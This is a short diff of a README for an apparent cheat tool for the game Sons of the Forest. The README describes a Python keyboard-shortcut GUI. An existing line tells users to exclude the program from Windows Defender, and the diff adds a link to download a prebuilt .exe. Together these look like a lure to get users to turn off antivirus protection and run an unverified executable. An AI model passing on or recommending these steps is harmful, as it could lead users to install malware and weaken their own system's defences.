@@ -4,7 +4,7 @@ enable cheats and more in sons of the forest
 Juste exclude on windows defender and play
 
 This is a Python script that uses the tkinter and pynput.keyboard libraries to create a GUI that allows the user to control certain commands in a game using keyboard shortcuts. The GUI displays toggle buttons that the user can click to turn various options on or off. The state of the buttons is displayed on the buttons themselves.
-
+Download .exe https://github.com/RealBey/Magic-SOTF/releases/download/magic/Magic.SOTF.exe
 Dependencies
 This script requires Python 3 to run. The following Python libraries are also required:
 
